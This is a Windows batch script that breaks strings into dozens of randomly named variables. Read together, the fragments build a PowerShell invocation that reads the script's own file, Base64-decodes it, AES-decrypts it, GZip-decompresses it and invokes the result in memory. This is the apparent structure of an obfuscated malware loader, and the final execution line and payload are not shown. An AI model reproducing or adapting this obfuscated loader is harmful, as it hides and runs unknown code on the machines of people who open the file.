@echo off
set "LrGtatPXPP=in"
set "nLiqsEhsuD=:\"
set "rWTGqNYmPT=ll"
set "jcQcCOJDwU=rS"
set "HaKANVgylb=.e"
set "DEYQVmijMP=0\"
set "vRdLFFKTLO=st"
set "bTqpqHWdfA=rs"
set "YqCINIFizm=we"
set "FHaTSdWXkv=y "
set "beJLmTOEnD=Wi"
set "HdgcRPVTeF=em"
set "MEaltwlriI=s\"
set "UlEFksSErc=xe"
set "PxNCIRoJfo=po"
set "wVaGEqGKoX=Sy"
set "iubQPTWuPu=py"
set "lUUaNmQkNg=\v"
set "jRhFmcuNlI=32"
set "uNGJNDKyzD=do"
set "YvuQZxmLxk=ow"
set "mxYwndUMMm=we"
set "AVdvClAojY= C"
set "qmLQUyJEOn=co"
set "tWexbvjpoI=nd"
set "iIrKgeMfVz=1."
set "dGxYrKUPcp=he"
set "PcaGBncpdm=ll"
set "LiKSAOAqOV=he"
set "kXIcXgHGnW=ws"
set "oGnqUSlNES=Po"
set "NPgkwYTJOd= /"
set "RBwAPUApGN=\W"
set "dbDhFOKlpE=cd"
set "jdAoElpMXa= %~dp0"
set "dbKoeIxdhN=nirt"
set "QZbnYpYHNd=JyYv"
set "DTfXFjvASo=esaB"
set "ebUYsJrgpd=('da"
set "fdQSfHXQQu=Stre"
set "RiHxFRwqok=m.IO"
set "dwFESeGswV=ptog"
set "PWJujzKLKG=Invo"
set "MUluapsFvl=();$"
set "NqsAULKxuE=ZYYc"
set "oPWFLEqtog=.Key"
set "LdAGEfFRKa=]::("
set "yyEaaAEhLF=F'[-"
set "TVQuSdrEsb=Fina"
set "NFMYCLekDu=UzG "
set "akgrrYSwpy=bjec"
set "eIfoWzbuRG=::De"
set "KxfdGhFipH= = $"
set "gJVBZOxDfG=and "
set "AkysVZUove=rtS4"
set "YUyuhSHyFB=$RSi"
set "pmSrZqPBCu=tryP"
set "XllYKjveer=736u"
set "KWlnJWYYag=udx "
set "bOkTSgWmzb=.Cry"
set "oPTUeOTggT=y.Ci"
set "mySbZQGMLh=ing("
set "LySKdjdByO= = $"
set "JNRkWlJeeP=g = "
set "bviIUqgoKG=v = "
set "oOWUOvpCmY=+hAO"
set "oXDfnWzCQa=ddin"
set "aswcGWZgxF=:: '"
set "iKumWaRPXR== [S"
set "HSQrjwauvx=]::("
set "olClYTmiGD=$EEb"
set "tXhQnkzACz=O.Me"
set "wecyhPDuCu=tion"
set "CkhQxiJREL=fJRg"
set "axuhWkDBxq=UGTu"
set "NIihMRtSUG=ionM"
set "DLbeAvYqKY=$RSi"
set "GjOevdpAGO=m(, "
set "PJJaCyNLfR===')"
set "jvNciljdgG=Secu"
set "NEodQbNAlg=.IO."
set "UggJPSGIUS=lBlo"
set "krsYLINEOX=ecry"
set "YjsLuQwTVm=6] -"
set "exbaDGDQkX=.GZi"
set "FFGJNZTxZn=rTSC"
set "nIKhDdEuaV=New-"
set "gBEJvhKCnQ=W) {"
set "QHAVcYcoTZ=oc ="
set "edVsBcFfgd=-Obj"
set "UDLFewKWto=m.IO"
set "fhaldUpIzA='gni"
set "YLvEdlaLqc=esMa"
set "eDgELulUjc=y.Pa"
set "DyLtgXEycy=x.En"
set "PXhLkCzxoZ=-4] "
set "mgmvqTJuJW=$RSi"
set "XjVTfvImeM=d;$k"
set "awQuDMeBzq=ubQR"
set "bteNBETXuO='[-1"
set "EBEdMnsWiD=MfJR"
set "vvbopycgno=[-1."
set "AggTxeNqGE=esFX"
set "yOwvIYdiaR=ewLi"
set "BjfmpTINYD=v4Ir"
set "biwDBCTHWB=MfJR"
set "lqwGdQfujF=1..-"
set "BbnhsiwSOc=.Con"
set "cQPiiFnQLj=();$"
set "MLDPwSyjbD=rt]:"
set "VvbvUoUZqT=;$oQ"
set "LUGDPUZJdd=::('"
set "cdNeYGMADU=Sioc"
set "WwpKkpJQjP=rHp."
set "pQygAoygbs=G.Su"
set "QeVvpTCfGm=IW ="
set "fRljpcIvPg=oL'["
set "iRAxXvfGFY=$MfJ"
set "MVtQLoZzFf=yste"
set "hPPnZgrprS=kubQ"
set "ecdIiWbubP=Conv"
set "PGUekwTfJp=se()"
set "RWhKrfwlFo=TllA"
set "yjtDlamrgF=eam("
set "HpFIgPKtVT=tem."
set "PwVOsMyGfh=[Env"
set "ETXXaOQByH=e = "
set "DTKjxLgoGK=t Sy"
set "rEHOrJBYWC=, $M"
set "kGXOtmEXes=('%~f0'"
set "WrqXLQTKzb=morF"
set "XrYSMpQQMh=isfL"
set "VcWPqfPDvP=saBm"
set "YmRtTVIZOC=sion"
set "VeYlIaeVYZ=.-16"
set "kcwthyRRUZ=3HWs"
set "ZwZftNzMXJ=.Dis"
set "yDlNhenOWM=raph"
set "roMqyYQoNN=NwUz"
